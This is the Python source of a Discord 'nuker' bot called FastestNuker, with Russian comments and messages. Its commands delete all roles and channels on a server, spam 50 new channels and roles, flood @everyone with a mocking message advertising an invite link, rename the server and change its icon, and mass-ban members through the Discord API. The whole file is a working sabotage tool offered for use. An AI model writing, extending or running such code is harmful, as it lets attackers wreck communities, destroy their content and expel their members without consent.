from discord import Intents
from discord.ext import commands
from requests import put
import discord
from asyncio import create_task

prefix = '!' # наш префикс

token = 'бот токен'

# включаем интенты и создаем переменную бота (client)
intents = Intents.default()
intents.members = True
client = commands.Bot(command_prefix=prefix,
                      help_command=None,
                      intents=intents)

async def killchannel(ctx,ch):
    try:
        await ch.delete()
    except:
        pass

async def sendch(ctx,ch,text,count):
 for _ in range(count):
    try:
        await ch.send(text)
    except:
        pass


async def killrole(ctx,role):
    try:
        await role.delete()
    except:
        pass

async def createchannel(ctx):
    try:
        c = await ctx.guild.create_text_channel('crash-by-fastestnuker')
    except:
        pass
    else:
        create_task(sendch(ctx,ch=c,text='@everyone\nУважаемые участники данного сервера :sunglasses:!\nК сожалению, админ или модератор этого сервера оказался :mammoth:ом, и добавил меня на сервер :clap:\nНу вообщем я так быстро всё удалил, что ваши колхозные aдмины ничего не сделали :joy:\nВообщем, наш сервер: https://discord.gg/fzlgroup :yellow_heart:',count=5))

async def createrole(ctx):
    try:
        await ctx.guild.create_role(name='Crushed By Fastest Nuker')
    except:
        pass

@client.command()
async def kill(ctx):
    for rolee in ctx.guild.roles:
        create_task(killrole(ctx,role=rolee))
    for channel in ctx.guild.text_channels:
        create_task(sendch(ctx,ch=channel,text='@everyone\nУважаемые участники данного сервера :sunglasses:!\nК сожалению, админ или модератор этого сервера оказался :mammoth:ом, и добавил меня на сервер :clap:\nНу вообщем я так быстро всё удалил, что ваши колхозные aдмины ничего не сделали :joy:\nВообщем, наш сервер: https://discord.gg/fzlgroup :yellow_heart:',count=1))
    for channel in ctx.guild.channels:
        create_task(killchannel(ctx,ch=channel))
    for _ in range(50):
        create_task(createchannel(ctx))
        create_task(createrole(ctx))

@client.command()
async def rename(ctx):
    with open('icon.PNG', 'rb') as f:
        icon = f.read()
        await ctx.guild.edit(name='Crashed by Fastest Nuker', icon=icon)

async def banus(ctx, limit=None):
    fetched = ctx.guild.fetch_members(limit=limit)
    memlist = await fetched.flatten()
    for member in memlist:
        if member.roles[-1].position >= ctx.guild.me.roles[-1].position:
            continue
        guild = ctx.guild
        put(f'https://discord.com/api/guilds/{guild.id}/bans/{member.id}', headers={'Authorization': 'Bot ' + token, 'X-Audit-Log-Reason': 'Crushed by FastestNuker'}, json={'delete_message_days': 1})

@client.command()
async def banall(ctx):
    create_task(banus(ctx,limit=None))

@client.command()
async def help(ctx):
    try:
        await ctx.author.send(embed=discord.Embed(title='FastestNuker',description=f'`!kill` - авто краш сервера\n`!rename` - сменить иконку и имя серверу\n`!banall` - бан всех участников сервера',colour=discord.Colour.from_rgb(228,66,0)))
    except:
        await ctx.send(embed=discord.Embed(title='Открой личку чтобы чекнуть хелп'))

    await ctx.message.delete()

client.run(token)
